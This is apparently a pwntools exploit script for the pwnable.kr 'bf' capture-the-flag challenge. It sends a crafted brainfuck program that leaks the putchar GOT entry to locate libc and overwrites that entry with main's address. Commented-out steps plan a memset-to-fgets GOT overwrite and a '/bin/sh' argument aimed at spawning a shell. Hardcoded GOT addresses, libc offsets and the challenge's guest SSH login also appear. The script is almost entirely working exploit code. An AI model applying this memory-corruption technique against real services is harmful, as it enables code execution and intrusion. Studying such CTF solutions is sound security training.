import struct
import socket
import os
import pwn

IP = 'pwnable.kr'
PORT = 9001
SSH_PORT = 2222
USER = 'unlink'
PASSWORD = 'guest'
FILENAME = './input.txt'
LOCAL_CMD = './bf < {}'.format(FILENAME)
CHUNK = 2048

MAIN_ADDR = 0x08048671
P_ADDR = 0x0804a0a0
main = 0x08048671
fgets_GOT = 0x0804a010
memset_GOT = 0x0804a02c
putchar_GOT = 0x0804a030
getchar_GOT = 0x0804a00c
__stack_chk_fail_GOT = 0x0804a014

system_bf_libc = 0x3ada0
fgets_bf_libc = 0x5e150
memset_bf_libc = 0x76fc0
putchar_bf_libc = 0x61920
getchar_bf_libc = 0x65b40
_IO_puts_bf_libc = 0x5fca0
__stack_chk_fail_bf_libc = 0xf7680

system_my_libc = 0x423d0
fgets_my_libc = 0x6a720
_IO_puts_my_libc = 0x6c140
__stack_chk_fail_my_libc = 0x10b790

def main():
	
	skt = pwn.ssh (host = IP, port = SSH_PORT, user = USER, password = PASSWORD)
	# pwn.context.log_level = 'debug'
	ps = skt.process (["nc", "0", "9001"])
	

	s = socket.socket()
	s.connect ((IP,PORT))
	toSend = ''



	"""
	# write 7 characters to tape's address: '/bin/sh'
	toSend += ',>' * 7 
	toSend += '<' * 7
	toSend += '.>' * 7

	toSend += '\n'
	toSend += '/bin/sh'
	"""


	"""
	# overwrite memset GOT entry to fgets
	toSend += '<' * (P_ADDR - memset_GOT)
	# write 4 bytes
	toSend += '-' * (memset_bf_libc - fgets_bf_libc)
	# restore P_ADDR
	toSend += '>' * (P_ADDR - memset_GOT)
	"""

	# leak putchar address on libc
	# trigger putchar
	toSend += '.' 
	# go to putchar GOT
	toSend += '<' * (P_ADDR - putchar_GOT)
	# print address
	toSend += '.>' * 4
	toSend += '>' * (P_ADDR - putchar_GOT - 4)

	# overwrite the putchar GOT entry to main address
	toSend += '<' * (P_ADDR - putchar_GOT)
	# write 4 bytes
	toSend += ',>' * 4
	# trigger putchar
	toSend += '.'
	toSend += '\n'
	toSend += struct.pack ('<I', MAIN_ADDR)
	# the memset->fgets user input
	toSend += '/bin/sh'

	with open (FILENAME, 'w') as f:
		f.write (toSend)

	

	print ('remote running..')
	# welcome message 1
	data = s.recv (CHUNK)
	print (data)
	# welcome message 2
	data = s.recv (CHUNK)
	print (data)

	s.send (toSend)

	# prints null termination
	data = s.recv (CHUNK)
	print (data)

	# prints leaked address and secondary welcome
	data = s.recv (CHUNK)
	print (data)

	# leftovers
	data = s.recv (CHUNK)
	print (data)

	
	
	# print ('local running..')
	# os.system (LOCAL_CMD)

	return

if __name__ == '__main__':
	main()